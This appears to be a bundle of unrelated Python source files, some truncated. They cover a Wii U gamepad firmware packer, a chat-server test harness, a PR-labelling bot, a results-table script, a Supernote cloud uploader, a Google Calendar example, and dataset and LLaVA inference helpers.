    "#!/usr/bin/env python3\n\"\"\"\nfwpack - Pack/Unpack DRC/DRH firmware files\nCreated in 2024 by GaryOderNichts\n<https://github.com/GaryOderNichts/drc-fw-patches>\n\nCredits to drxtool for the firmware header logic and extracted files structure.\n\"\"\"\n\nimport sys, os\nimport binascii\nimport construct\n\nclass FirmwareType:\n    FIRMWARE_TYPE_DRC = 0x01010000\n    FIRMWARE_TYPE_DRH = 0x00010000\n\nBlobHeader = construct.Struct(\n    \"imageVersion\" / construct.Int32ub,\n    \"blockSize\" / construct.Int32ub,\n    \"sequencePerSession\" / construct.Int32ub,\n    \"imageSize\" / construct.Int32ub,\n)\nassert(BlobHeader.sizeof() == 0x10)\n\nFirmwareHeader = construct.Struct(\n    \"type\" / construct.Int32ul,\n    \"superCRCs\" / construct.Array(4, construct.Int32ul),\n    construct.Padding(0xFE8),\n    \"headerCRC\" / construct.Int32ul,\n    \"subCRCs\" / construct.Array(0x1000, construct.Int32ul),\n)\nassert(FirmwareHeader.sizeof() == 0x5000)\n\nFirmwareSection = construct.Struct(\n    \"offset\" / construct.Int32ul,\n    \"size\" / construct.Int32ul,\n    \"name\" / construct.PaddedString(4, \"ascii\"),\n    \"version\" / construct.Int32ul,\n)\nassert(FirmwareSection.sizeof() == 0x10)\n\nFirmwareFile = construct.Struct(\n    \"blobHeader\" / BlobHeader,\n    \"firmwareHeader\" / FirmwareHeader,\n    \"firmwareData\" / construct.Bytes(construct.this.blobHeader.imageSize - FirmwareHeader.sizeof()),\n)\n\n# Thanks to drxtool for the crctable logic\ndef verify_firmware_header(fw) -> bool:\n    # Verify header CRC\n    header_crc = binascii.crc32(FirmwareHeader.build(fw.firmwareHeader)[0:0xFFC])\n    if header_crc != fw.firmwareHeader.headerCRC:\n        return False\n    \n    # Verify super crcs\n    subcrc_data = construct.Array(0x1000, construct.Int32ul).build(fw.firmwareHeader.subCRCs)\n    for i in range(4):\n        super_crc = binascii.crc32(subcrc_data[i*0x1000:i*0x1000+0x1000])\n        if super_crc != fw.firmwareHeader.superCRCs[i]:\n            return False\n\n    # Verify sub crcs\n    for i in range(len(fw.firmwareData) // 0x1000 + 1):\n        offset = i * 0x1000\n        length = 0x1000\n        if len(fw.firmwareData) - offset < length:\n            length = len(fw.firmwareData) - offset\n\n        sub_crc = binascii.crc32(fw.firmwareData[offset:offset + length])\n        if sub_crc != fw.firmwareHeader.subCRCs[i]:\n            return False\n\n    return True\n\ndef build_firmware_header(blob_type, firmware_data) -> dict:\n    # Calculate CRC for every 0x1000 bytes of firmware data\n    sub_crcs = [0] * 0x1000\n    for i in range(len(firmware_data) // 0x1000 + 1):\n        offset = i * 0x1000\n        length = 0x1000\n        if len(firmware_data) - offset < length:\n            length = len(firmware_data) - offset\n\n        sub_crcs[i] = binascii.crc32(firmware_data[offset:offset + length])\n\n    # Calculate the super CRCs\n    super_crcs = [0] * 4\n    subcrc_data = construct.Array(0x1000, construct.Int32ul).build(sub_crcs)\n    for i in range(4):\n        super_crcs[i] = binascii.crc32(subcrc_data[i*0x1000:i*0x1000+0x1000])\n\n    firmware_header = dict(type=blob_type, superCRCs=super_crcs, headerCRC=0, subCRCs=sub_crcs)\n\n    # Calculate the header CRC\n    firmware_header[\"headerCRC\"] = binascii.crc32(FirmwareHeader.build(firmware_header)[0:0xFFC])\n\n    return firmware_header\n\ndef unpack_firmware(source_file, dest_dir):\n    fw = FirmwareFile.parse_file(source_file)\n    if not verify_firmware_header(fw):\n        print(\"Firmware header verification failed\")\n        sys.exit(1)\n\n    if fw.firmwareHeader.type == FirmwareType.FIRMWARE_TYPE_DRC:\n        print(f\"DRC firmware version 0x{fw.blobHeader.imageVersion:08x}\")\n    elif fw.firmwareHeader.type == FirmwareType.FIRMWARE_TYPE_DRH:\n        print(f\"DRH firmware version 0x{fw.blobHeader.imageVersion:08x}\")\n    else:\n        print(f\"Unsupported firmware type 0x{fw.firmwareHeader.type:08x}\")\n        sys.exit(1)\n\n    if not os.path.isdir(dest_dir):\n        os.mkdir(dest_dir)\n\n    # Write blob header and type\n    BlobHeader.build_file(fw.blobHeader, os.path.join(dest_dir, \"blob_header.bin\"))\n    construct.Int32ul.build_file(fw.firmwareHeader.type, os.path.join(dest_dir, \"blob_type.bin\"))\n\n    # Assume first part of the data is the index\n    index = FirmwareSection.parse(fw.firmwareData)\n\n    # Parse sections\n    sections = construct.Array(index.size // FirmwareSection.sizeof(), FirmwareSection).parse(fw.firmwareData)\n    for s in sections:\n        print(f\"Saving {s.name} version 0x{s.version:08x} offset 0x{s.offset} size 0x{s.size}\")\n\n        # write section to file\n        with open(os.path.join(dest_dir, s.name + \".bin\"), \"wb\") as f:\n            f.write(fw.firmwareData[s.offset:s.offset + s.size])\n\ndef pack_firmware(source_dir, dest_file):\n    # Read blob header and type\n    blob_header = BlobHeader.parse_file(os.path.join(source_dir, \"blob_header.bin\"))\n    blob_type = construct.Int32ul.parse_file(os.path.join(source_dir, \"blob_type.bin\"))\n\n    # Parse sections from INDX\n    firmware_data = b\"\"\n    sections = construct.GreedyRange(FirmwareSection).parse_file(os.path.joi",
    "import pexpect\nimport os\nimport argparse\nimport json\nimport random\nimport string\nfrom pexpect.exceptions import TIMEOUT as TimeoutException, EOF as EndOfFileException\nimport time\n\nCLIENT_FOLDER_PATH = './'\nADDRESS = \"127.0.0.1\"\nPORT = 5378\nSTUDENT_FILE_PATH = \"../student/server_check/server.py\"\n\ndef generate_name():\n    return ''.join(random.choice(string.ascii_letters) for _ in range(random.randint(8, 16)))\n\ndef generate_message(min_len=32, max_len=64):\n    return ''.join(random.choice(string.ascii_letters) for _ in range(random.randint(min_len, max_len)))\n\nclass TestException(Exception):\n    pass\n\ndef handle_pexpect(child_process, processes_to_terminate, expect_string, output_buffer, step, timeout=1):\n    try:\n        child_process.expect(expect_string, timeout=timeout)\n        output_buffer += child_process.before + child_process.after\n\n    except TimeoutException:\n        output_buffer += child_process.before\n        last_printed_line = '[EMPTY LINE. PROGRAM DID NOT PRODUCE ANY OUTPUT]'\n        lines = output_buffer.split('\\n')\n\n        for line in reversed(lines):\n            if line.strip():\n                last_printed_line = line\n                break\n\n        for process in processes_to_terminate:\n            process.terminate(force=True)\n\n        raise TestException(f'unexpected client output at the step {step}!\\nExpected output:\\n\\n{expect_string}\\n\\nActual output (the last printed line): \\n\\n{last_printed_line}\\n\\nTotal program output:\\n\\n{output_buffer}')\n    except EndOfFileException:\n        output_buffer += child_process.before + child_process.after\n\n        for process in processes_to_terminate:\n            process.terminate(force=True)\n            \n        raise TestException(f'program has unexpectidly terminated at step {step}!\\nExpected output:\\n\\n{expect_string}\\n\\nProgram\\'s last printed line: \\n\\n{last_printed_line}\\n\\nTotal program output:\\n\\n{output_buffer}')\n    \n    return output_buffer\n\ndef start_server():\n    server_process = execute_and_detach(f'python3 {STUDENT_FILE_PATH} --address \"{ADDRESS}\" --port {PORT}')\n    expected_output = \"Server is on\"\n\n    output_buffer = handle_pexpect(server_process, [server_process], expected_output, \"\", \"starting a server\")\n        \n    return server_process, output_buffer\n\n\ndef execute_and_wait(cmd):\n    process = pexpect.spawn('/bin/sh', ['-c', cmd], encoding='utf-8')\n    process.expect(pexpect.EOF)\n    output = process.before  # Capture the output\n    process.wait()\n\n    return process.exitstatus, output\n\ndef execute_and_collect_output(cmd):\n    child = pexpect.spawn(cmd, encoding='utf-8')\n    while True:\n        try:\n            line = child.readline()\n            if not line:\n                break\n            yield line\n        except pexpect.EOF:\n            break\n\ndef execute_and_detach(cmd):\n    child = pexpect.spawn(cmd, encoding='utf-8')\n    return child\n    \n\ndef start_script():\n    expected_output = 'Welcome to Chat Client. Enter your login:'\n\n    current_dir = os.getcwd()\n    os.chdir(CLIENT_FOLDER_PATH)\n\n    client_process = pexpect.spawn(f'java -jar ChatClient.jar', encoding='utf-8')\n\n    os.chdir(current_dir)\n\n    output_buffer = handle_pexpect(client_process, [client_process], expected_output, \"\", \"starting a client\")\n\n    return client_process, output_buffer\n\ndef log_in(client_name=\"client\"):\n    expected_output = f'Succesfully logged in as {client_name}!'\n\n    client_process, output_buffer = start_script()\n    client_process.sendline(client_name)\n\n    output_buffer = handle_pexpect(client_process, [client_process], expected_output, output_buffer, \"logging in with a client\")\n\n    return client_process, output_buffer\n\ndef reject_usernames_commas():\n    client_name_pt1 = generate_name()\n    client_name_pt2 = generate_name()\n    \n    expected_output = \"BAD-RQST-BODY\"\n    _, output = execute_and_wait(f'echo \"HELLO-FROM {client_name_pt1},{client_name_pt2}\" | nc 127.0.0.1 5378 -W 1')\n    \n    if not expected_output in output:\n        raise TestException(f\"your sever did not return BAD-RQST-BODY when logging in with a username that contains commas. Reply was '{output}'\")\n\n    return output\n\ndef reject_usernames_spaces():\n    client_name_pt1 = generate_name()\n    client_name_pt2 = generate_name()\n    \n    expected_output = \"BAD-RQST-BODY\"\n    _, output = execute_and_wait(f'echo \"HELLO-FROM {client_name_pt1} {client_name_pt2}\" | nc 127.0.0.1 5378 -W 1')\n    \n    if not expected_output in output:\n        raise TestException(f\"your sever did not return BAD-RQST-BODY when logging in with a username that contains spaces. Reply was '{output}'\")\n\n    return output\n\ndef test_16_clients():\n    MAX_CLIENTS = 16\n    client_nameS = [generate_name() for _ in range(MAX_CLIENTS)]\n\n    [log_in(f'{client_nameS[i]}') for i in range(0, 16)]\n\ndef test_busy():\n    MAX_CLIENTS = 16\n\n    client_names = [generate_name() for _ in range(MAX_CLIENTS)]\n    logged_processes = [log_in(f'{client_names[i]}') for i in range(0, 16)]\n\n    client_name = generate_name()\n ",
    "from github import Repository\n\nfrom bots import bot\n\nclass PRLabelBot(bot.GitAutomatorBot):\n    def handle_action(self, _: str):\n        pull = self.repo_client.get_pull(self.webhook_body['pull_request']['number'])\n        if pull.title.startswith('fix'):\n            bug_label = self.repo_client.get_label('bug')\n            if bug_label is not None:\n                pull.add_to_labels(bug_label)\n        if pull.title.startswith('doc'):\n            doc_label = self.repo_client.get_label('documentation')\n            if doc_label is not None:\n                pull.add_to_labels(doc_label)\n        if pull.title.startswith('feat'):\n            en_label = self.repo_client.get_label('enhancement')\n            if en_label is not None:\n                pull.add_to_labels(en_label)\n\n    @property\n    def name(self) -> str:\n        return 'prlabel'\n\ndef new_gitautomator_bot(repo_client: Repository.Repository, json_body: dict, token: str) -> bot.GitAutomatorBot:\n    return PRLabelBot(repo_client, json_body, token)\n",
    "from pathlib import Path\nimport re\n\nfrom easy_io import read_json, dump_str_list_to_txt_file\n\nfrom src.path import baseline_performance_dir, baseline_table_dir\nfrom src.config import new_datasets_names, covnert_dataset_name_dict, new_datasets_initial_models, baseline_models_open, baseline_models_closed, convert_category_name_dict\nfrom src.baseline.prompt import simple_prompt_baseline_prompts_dict, advanced_prompt_dict\n\n\ncategory_table_dir = baseline_table_dir / \"category_results_tables\"\n\n\nif __name__ == \"__main__\":\n    baseline_table_dir.mkdir(parents=True, exist_ok=True)\n    \n    baseline_models = baseline_models_open + baseline_models_closed\n    easy_baseline_performance = read_json(baseline_performance_dir / \"easy_baseline\" / \"performance.json\")\n    human_performance = read_json(baseline_performance_dir / \"human_performance.json\")\n    \n    for baseline_name in [\"simple_prompt_baseline\"]:\n        performance_dict: dict[str, dict[str, dict[str, dict]]] = read_json(baseline_performance_dir / baseline_name / \"performance.json\")\n\n        if baseline_name == \"simple_prompt_baseline\":\n            prompt_names_list = list(simple_prompt_baseline_prompts_dict.keys()) + [\"average\"]\n        else:\n            prompt_names_list = list(advanced_prompt_dict.keys())\n        \n        for prompt_name in prompt_names_list:\n            prompt_key = \"average\" if prompt_name == \"average\" else f\"prompt={prompt_name}\"\n            \n            for metric in [\"accuracy\", \"f1\", \"precision\", \"recall\"]:\n                output_dir = baseline_table_dir / baseline_name / metric\n                output_dir.mkdir(parents=True, exist_ok=True)\n                \n                # build latex table\n                first_row =  f\"{'initial model':>30s} & {'dataset':>30s} & \" + \" & \".join([f\"{s.split('/')[-1]:>30s}\" for s in baseline_models + [\"random\", \"human\"]]) + \"  \\\\\\\\\"\n                latex_table_lines = [first_row]\n                \n                for initial_model_name in new_datasets_initial_models:\n                    datasets_list = new_datasets_names\n                    if baseline_name == \"simple_prompt_baseline\":\n                        datasets_list = datasets_list # + [\"average\"]\n                    \n                    for dataset_name in datasets_list:\n                        if dataset_name == \"average\" and prompt_name != \"average\":\n                            continue\n                        \n                        converted_dataset_name = \"Average\" if dataset_name == \"average\" else covnert_dataset_name_dict[dataset_name]\n                        dataset_name_str = f\"\\scalebox{{0.9}}[1]{{{converted_dataset_name}}}\"\n                        row_list = [f\"{'':>30s}\", f\"{dataset_name_str:>30s}\"]\n                        \n                        performance_list: list[float] = []\n                        for baseline_model_name in baseline_models:\n                            baseline_model_performance = performance_dict[dataset_name][f\"initial_model={initial_model_name}\"].get(f\"baseline_model={baseline_model_name}\")\n                            \n                            if baseline_model_performance is None or len(baseline_model_performance[prompt_key]) == 0:\n                                performance_list.append(-1)\n                            else:\n                                value = baseline_model_performance[prompt_key][\"metrics\"][metric]\n                                if prompt_key == \"average\":\n                                    value = value[\"average\"]\n                                \n                                performance_list.append(value * 100)\n                        \n                        # easy baseline\n                        random_performance = easy_baseline_performance[dataset_name][f\"initial_model={initial_model_name}\"][\"baseline_model=random\"][\"metrics\"][metric] * 100\n                             \n                        # make top n bold\n                        top_n = 1\n                        top_n_indices = sorted(range(len(performance_list)), key=lambda i: performance_list[i], reverse=True)[:top_n]\n                        for idx, val in enumerate(performance_list):\n                            if idx in top_n_indices:\n                                performance_str = f\"\\\\textbf{{{val:.1f}}}\"\n                                row_list.append(f\"{performance_str:>30s}\")\n                            elif val < random_performance:\n                                row_list.append(f\"\\\\cellcolor[RGB]{{211,211,211}}{{{val:.1f}}}\")\n                            elif val == -1:\n                                row_list.append(f\"{'':>30s}\")\n                            else:\n                                row_list.append(f\"{val:30.1f}\")\n                        \n                        # # always error baseline\n                        # always_error_performance = easy_baseline_performance[dataset_name][f\"initial_model={initial_model_name}\"][\"baseline_model=always_error\"][\"metrics\"][metric] * 100\n                  ",
    "import requests, os\nfrom hashlib import sha256, md5\n\n# thank you \n# https://github.com/adrianba/supernote-cloud-api/\n# https://github.com/colingourlay/supernote-cloud-api/\n\nAPI_BASE = \"https://cloud.supernote.com/api/\"\n\ndef _sha256_s(s):\n    return sha256(s.encode('utf-8')).hexdigest()\ndef _md5_s(s):\n    return md5(s.encode('utf-8')).hexdigest()\ndef _md5_b(b):\n    return md5(b).hexdigest()\n\ndef _post_json(path, payload, token=None):\n    headers = {\n        \"Content-Type\": \"application/json\",\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36\"\n    }\n    if token is not None:\n        headers['x-access-token'] = token\n    response = requests.post(API_BASE+path, json=payload, headers=headers)\n    return response.json()\n\ndef _get_random_code(email):\n    # countrycode \n    payload = {'countryCode': \"1\", \"account\":email }\n    data = _post_json(\"official/user/query/random/code\", payload)\n    return (data['randomCode'], data['timestamp'])\n\ndef _get_access_token(email, password, rc, timestamp):\n    pd = _sha256_s(_md5_s(password) + rc);\n    payload = {'countryCode':1, 'account':email, 'password':pd, \n        'browser':'Chrome107', 'equipment':\"1\", \"loginMethod\":\"1\", \"timestamp\":timestamp, \"language\":\"en\"}\n    data = _post_json(\"official/user/account/login/new\", payload)\n    return data['token']\n\n# returns access token\ndef login(email, password):\n    (rc, timestamp) = _get_random_code(email)\n    return _get_access_token(email, password, rc, timestamp)\n\ndef file_list(token, directory=0):\n    payload = {\"directoryId\": directory, \"pageNo\":1, \"pageSize\":100, \"order\":\"time\", \"sequence\":\"desc\"}\n    data = _post_json(\"file/list/query\", payload, token=token)\n    return data['userFileVOList']\n\ndef download_file(token, id, filename=None):\n    payload = {\"id\":id, \"type\":0}\n    data = _post_json(\"file/download/url\", payload, token=token)\n    c = requests.get(data['url']).content\n    if(filename is not None):\n        f = open(filename,'wb')\n        f.write(c)\n        f.close()\n    else:\n        return c\n\ndef upload_file(token, filename, directory=0):\n    file_contents = open(filename,'rb').read()\n    data_md5 = _md5_b(file_contents)\n    payload = {'directoryId':directory, 'fileName':filename, 'md5':data_md5, 'size':len(file_contents)}\n    data = _post_json('file/upload/apply', payload, token=token)\n    if(data['success']):\n        put_headers = {'Authorization':data['s3Authorization'], 'x-amz-date':data['xamzDate'], \"x-amz-content-sha256\": \"UNSIGNED-PAYLOAD\"}\n        requests.put(data['url'], file_contents, headers=put_headers)\n        inner_name = os.path.basename(data['url'])\n        payload = {\"directoryId\":directory, \"fileName\":filename, \"fileSize\":len(file_contents), \"innerName\":inner_name,\"md5\":data_md5}\n        data = _post_json(\"file/upload/finish\", payload, token=token)\n    else:\n        print(\"Error: %s\" % (data['errorMsg']))\n\n# as an example, we download the latest NYT crossword and put it on the folder Document/puzzles\n# your auth.txt file in the current folder should have\n# username,password\n# NYT-cookie0 (load the NYT page and copy your cookies)\n# NYT-cookie1 (\"print\" a crossword and copy your cookies from that request)\nif __name__ == '__main__':\n    import nyt\n    uploaded=False\n    auth = open('auth.txt').read().split('\\n')\n    (username,password) = auth[0].split(',')\n    puzzle_fn = nyt.get(auth[1], auth[2])\n    if puzzle_fn is not None:\n        token = login(username, password)\n        if token is None:\n            print(\"Couldn't log into supernote\")\n        else:\n            for d in file_list(token):\n                if(d['isFolder']=='Y' and d['fileName']==\"Document\"): \n                    document_id = d['id']\n                    for d in file_list(token, document_id):\n                        if(d['isFolder']=='Y' and d['fileName']==\"puzzles\"): \n                            puzzles_id = d['id']\n                            upload_file(token, puzzle_fn, directory=puzzles_id)\n                            uploaded = True\n            if not uploaded:\n                print(\"Didn't upload puzzle. Check you have a puzzles folder in Document on Supernote cloud\")\n\n    else:\n        print(\"Problem downloading puzzle, bad NYT cookies?\")\n",
    "import csv\nimport sys\nimport sqlite3\n\nfrom PyQt5 import QtWidgets\nfrom PyQt5.QtWidgets import QFileDialog, QTableWidgetItem\n\nimport design\n\n#cd pythonProject3\n#python -m venv venv\n#source venv/bin/activate\n#pip install -r requirements.txt\n\n# \u0414\u043b\u044f \u043e\u0431\u043d\u043e\u0432\u043b\u0435\u043d\u0438\u044f \u0438\u043d\u0442\u0435\u0440\u0444\u0435\u0439\u0441\u0430 \u0432\u044b\u043f\u043e\u043b\u043d\u0438\u0442\u044c \u043a\u043e\u043c\u0430\u043d\u0434\u0443: pyuic5 design.ui -o design.py\n\n\nclass App(QtWidgets.QMainWindow, design.Ui_MainWindow):\n\n    def __init__(self):\n        super().__init__()\n        self.setupUi(self)\n        self.open_magaz.triggered.connect(self.open_magaz_file)\n        self.save_magaz.triggered.connect(self.save_magaz_file)\n\n    def open_magaz_file(self):\n        con = sqlite3.connect('database.db')\n        cursor = con.cursor()\n\n        sql = 'SELECT * FROM Artist'\n        out = cursor.execute(sql).fetchall()\n\n        self.table_magaz.setColumnCount(len(out[0]))\n        self.table_magaz.setRowCount(len(out))\n\n        self.table_magaz.setHorizontalHeaderLabels([\"id\", \"artist\"])\n\n        for row in range(self.table_magaz.rowCount()):\n            for column in range(self.table_magaz.columnCount()):\n                item = QTableWidgetItem(str(out[row][column]))\n                print(item.text())\n                self.table_magaz.setItem(row, column, item)\n\n    def save_magaz_file(self):\n        con = sqlite3.connect('database.db')\n        cursor = con.cursor()\n\n        sql = 'SELECT Imya, Nazvanie FROM Artist JOIN Albom ON Artist.id = Albom.id'\n        out = cursor.execute(sql).fetchall()\n\n        with open(\"db.csv\", \"w\") as file:\n            writer = csv.writer(file, delimiter=\"l\")\n            writer.writerow((\"\u041d\u0430\u0437\u0432\u0430\u043d\u0438\u0435\", \"\u0418\u0441\u043f\u043e\u043b\u043d\u0438\u0442\u0435\u043b\u044c\"))\n            writer.writerows(out)\n\ndef main():\n    app = QtWidgets.QApplication(sys.argv)\n    window = App()\n    window.show()\n    app.exec_()\n\n\nif __name__ == '__main__':\n    main()\n",
    "# Example script for inserting events into google calendar using the api\n\nimport os.path\n\nfrom google.auth.transport.requests import Request\nfrom google.oauth2.credentials import Credentials\nfrom google_auth_oauthlib.flow import InstalledAppFlow\nfrom googleapiclient.discovery import build\nfrom googleapiclient.errors import HttpError\nfrom decouple import config\n\n# If modifying these scopes, delete the file token.json.\nSCOPES = [\"https://www.googleapis.com/auth/calendar\"]\n\n\ndef main():\n    \"\"\"Shows basic usage of the Google Calendar API.\n  Prints the start and name of the next 10 events on the user's calendar.\n  \"\"\"\n    creds = None\n    # The file token.json stores the user's access and refresh tokens, and is\n    # created automatically when the authorization flow completes for the first\n    # time.\n    if os.path.exists(\"token.json\"):\n        creds = Credentials.from_authorized_user_file(\"token.json\", SCOPES)\n    # If there are no (valid) credentials available, let the user log in.\n    if not creds or not creds.valid:\n        if creds and creds.expired and creds.refresh_token:\n            creds.refresh(Request())\n        else:\n            flow = InstalledAppFlow.from_client_secrets_file(\n                \"credentials.json\", SCOPES\n            )\n            creds = flow.run_local_server(port=0)\n        # Save the credentials for the next run\n        with open(\"token.json\", \"w\") as token:\n            token.write(creds.to_json())\n\n    try:\n        service = build(\"calendar\", \"v3\", credentials=creds)\n        \n        event = {\n            'summary': 'Google I/O 2015',\n            'location': '800 Howard St., San Francisco, CA 94103',\n            'description': 'A chance to hear more about Google\\'s developer products.',\n            'start': {\n                'dateTime': '2024-04-04T09:00:00',\n                'timeZone': 'Europe/Budapest',\n            },\n            'end': {\n                'dateTime': '2024-04-04T17:00:00',\n                'timeZone': 'Europe/Budapest',\n            }\n        }\n        event = service.events().insert(calendarId=\"primary\", body=event).execute()\n        \n        \n        print('Event created: ', event.get('htmlLink'))\n\n    except HttpError as error:\n        print(f\"An error occurred: {error}\")\n\n\nif __name__ == \"__main__\":\n    main()\n",
    "from __future__ import print_function as _\n\nimport os as _os\nimport sys as _sys\nimport json\n\nimport dash as _dash\n\n# noinspection PyUnresolvedReferences\nfrom ._imports_ import *\nfrom ._imports_ import __all__\n\nif not hasattr(_dash, '__plotly_dash') and not hasattr(_dash, 'development'):\n    print('Dash was not successfully imported. '\n          'Make sure you don\\'t have a file '\n          'named \\n\"dash.py\" in your current directory.', file=_sys.stderr)\n    _sys.exit(1)\n\n_basepath = _os.path.dirname(__file__)\n_filepath = _os.path.abspath(_os.path.join(_basepath, 'package-info.json'))\nwith open(_filepath) as f:\n    package = json.load(f)\n\npackage_name = package['name'].replace(' ', '_').replace('-', '_')\n__version__ = package['version']\n\n_current_path = _os.path.dirname(_os.path.abspath(__file__))\n\n_this_module = _sys.modules[__name__]\n\nasync_resources = []\n\n_js_dist = []\n\n_js_dist.extend(\n    [\n        {\n            \"relative_package_path\": \"async-{}.js\".format(async_resource),\n            \"external_url\": (\n                \"https://unpkg.com/{0}@{2}\"\n                \"/{1}/async-{3}.js\"\n            ).format(package_name, __name__, __version__, async_resource),\n            \"namespace\": package_name,\n            \"async\": True,\n        }\n        for async_resource in async_resources\n    ]\n)\n\n# TODO: Figure out if unpkg link works\n_js_dist.extend(\n    [\n        {\n            \"relative_package_path\": \"async-{}.js.map\".format(async_resource),\n            \"external_url\": (\n                \"https://unpkg.com/{0}@{2}\"\n                \"/{1}/async-{3}.js.map\"\n            ).format(package_name, __name__, __version__, async_resource),\n            \"namespace\": package_name,\n            \"dynamic\": True,\n        }\n        for async_resource in async_resources\n    ]\n)\n\n_js_dist.extend(\n    [\n        {\n            'relative_package_path': 'dash_insta_stories.min.js',\n    \n            'namespace': package_name\n        },\n        {\n            'relative_package_path': 'dash_insta_stories.min.js.map',\n    \n            'namespace': package_name,\n            'dynamic': True\n        }\n    ]\n)\n\n_css_dist = []\n\n\nfor _component in __all__:\n    setattr(locals()[_component], '_js_dist', _js_dist)\n    setattr(locals()[_component], '_css_dist', _css_dist)\n",
    "# modified from https://github.com/CompVis/taming-transformers/blob/24268930bf1dce879235a7fddd0b2355b84d7ea6/taming/data/base.py#L23\n# https://github.com/CompVis/taming-transformers#ffhq\n\nimport json\nimport math\nimport os\nfrom pathlib import Path\nimport PIL\nfrom einops import rearrange\nfrom loguru import logger\nimport numpy as np\nfrom PIL import Image\nimport torch\nfrom torch.utils.data import Dataset\nfrom tqdm import tqdm\nfrom torchvision import transforms\nfrom numpy.random import default_rng\nimport h5py\n\n\n\nclass FFHQ_v2(Dataset):\n    def __init__(\n        self,\n        root,\n        size=None,\n        size_file = 1024,\n        split=\"train\",\n        img_save_path=None,\n        num_samples=1.0,\n        random_crop=False,\n        debug=False,\n        seed=0,\n    ):\n\n        self.dataset_name = \"ffhq\"\n        self.img_save_path = img_save_path\n        self.debug = debug\n        self.split_name = split\n        self.size  = size\n        self.random_crop = random_crop\n        \n\n        if size_file == 64:\n            root = root.replace(\"128\", \"64\")\n            print(\"root = root.replace('128','64')\")\n        else:\n            assert \"128\" in root or \"1024\" in root, \"root {} must contain 128/1024\".format(root)\n        logger.warning(f\"reading from dir {root}\")\n\n        if split == \"train\":\n            txt_name = \"lfm_dataset/data_files/ffhqtrain.txt\"\n        else:\n            txt_name = \"lfm_dataset/data_files/ffhqvalidation.txt\"\n\n        pathlist = list()\n        with open(txt_name, \"r\") as f:\n            relpaths = f.read().splitlines()\n        for name in relpaths:\n            _file_name = (\n                str(int(name.replace(\".png\", \"\")) //\n                    1000).zfill(2) + \"000/\" + name\n            )\n            pathlist.append(\n                str(Path(os.path.join(root, _file_name)).expanduser().resolve()))\n        #################\n         \n        self.pathlist = pathlist\n\n        if num_samples is not None:\n\n            idx = np.array([i for i in range(len(self.pathlist))])\n            default_rng(seed).shuffle(idx)\n\n            self.pathlist = [self.pathlist[_id] for _id in idx]\n\n            if isinstance(num_samples, int):\n                _partial_rate = num_samples / len(self.pathlist)\n\n            elif isinstance(num_samples, float):\n                _partial_rate = num_samples\n                num_samples = int(_partial_rate * len(self.pathlist))\n\n            else:\n                raise ValueError(\n                    f'num_samples must be int or float, got {type(num_samples)}')\n            self.pathlist = self.pathlist[:num_samples]\n                \n            logger.warning(f'Using only {num_samples} images')\n            _partial_rate_inverse = math.ceil(1.0/_partial_rate)\n\n            self.pathlist = self.pathlist*_partial_rate_inverse\n            \n\n\n        self._length = len(self.pathlist)\n\n\n    def id2name(self, index):\n        file_name = os.path.basename(self.pathlist[index])\n        return file_name\n\n    def _read_img_segmask(self, index):\n        image_path = self.pathlist[index]\n        image = Image.open(image_path)\n        if not image.mode == \"RGB\":\n            image = image.convert(\"RGB\")\n        return image, None\n\n    def __len__(self):\n        return 1000 if self.debug else self._length\n\n    def get_imgid_from_imagepath(self, image_path):\n        return os.path.basename(image_path).split(\".\")[0]\n\n    def __getitem__(self, index):\n        result = dict()\n        image, _ = self._read_img_segmask(index)\n        image = torch.from_numpy(\n            np.array(image.resize((self.size, self.size), Image.BILINEAR))\n        )\n        image = rearrange(image, \"w h c -> c w h\")\n\n        image = (image / 255.0)* 2 - 1  # [0,1]->[-1,1]\n\n        \n        return image, image \n\n\nif __name__ == \"__main__\":\n    pass\n",
    "import os\nimport argparse\nimport torch\n\nfrom llava.constants import IMAGE_TOKEN_INDEX, DEFAULT_IMAGE_TOKEN, DEFAULT_IM_START_TOKEN, DEFAULT_IM_END_TOKEN\nfrom llava.conversation import conv_templates, SeparatorStyle\nfrom llava.model.builder import load_pretrained_model\nfrom llava.utils import disable_torch_init\nfrom llava.mm_utils import process_images, tokenizer_image_token, get_model_name_from_path, KeywordsStoppingCriteria\n\nimport requests\nfrom PIL import Image\nfrom io import BytesIO\nfrom transformers import TextStreamer\n\nfrom tasks import get_task_data\nimport json\nfrom tqdm import tqdm\nimport copy\n\ndef load_image(image_file):\n    if image_file.startswith('http://') or image_file.startswith('https://'):\n        response = requests.get(image_file)\n        image = Image.open(BytesIO(response.content)).convert('RGB')\n    else:\n        image = Image.open(image_file).convert('RGB')\n    return image\n\ndef _run_model_single_inference(model, tokenizer, image_processor, conv, args):\n    \"\"\"\n        conv: conversation object\n        args: inference configs\n    \"\"\"\n    # load image\n    if args.image_file is not None and args.image_file != \"\":\n        image = load_image(args.image_file)\n    else:\n        image = None\n    \n    if image is not None:\n        # Similar operation in model_worker.py\n        image_tensor = process_images([image], image_processor, args)\n        if type(image_tensor) is list:\n            image_tensor = [image.to(model.device, dtype=torch.float16) for image in image_tensor]\n        else:\n            image_tensor = image_tensor.to(model.device, dtype=torch.float16)\n    else:\n        image_tensor = None\n\n    # add text prompt \n    inp = args.text_prompt\n\n    if image is not None:\n        # first message\n        if model.config.mm_use_im_start_end:\n            inp = DEFAULT_IM_START_TOKEN + DEFAULT_IMAGE_TOKEN + DEFAULT_IM_END_TOKEN + '\\n' + inp\n        else:\n            inp = DEFAULT_IMAGE_TOKEN + '\\n' + inp\n        conv.append_message(conv.roles[0], inp)\n        image = None\n    else:\n        # later messages\n        conv.append_message(conv.roles[0], inp)\n\n    conv.append_message(conv.roles[1], None)\n    prompt = conv.get_prompt()\n\n    if image is not None:\n        input_ids = tokenizer_image_token(prompt, tokenizer, IMAGE_TOKEN_INDEX, return_tensors='pt').unsqueeze(0).cuda()\n    else:\n        input_ids = tokenizer(prompt, return_tensors='pt').input_ids.cuda()\n\n    stop_str = conv.sep if conv.sep_style != SeparatorStyle.TWO else conv.sep2\n    keywords = [stop_str]\n    stopping_criteria = KeywordsStoppingCriteria(keywords, tokenizer, input_ids)\n    # streamer = TextStreamer(tokenizer, skip_prompt=True, skip_special_tokens=True)\n\n    with torch.inference_mode():\n        output_ids = model.generate(\n            input_ids,\n            images=image_tensor,\n            do_sample=True if args.temperature > 0 else False,\n            temperature=args.temperature,\n            max_new_tokens=args.max_new_tokens,\n            # streamer=streamer,\n            use_cache=True,\n            stopping_criteria=[stopping_criteria])\n\n    outputs = tokenizer.decode(output_ids[0, 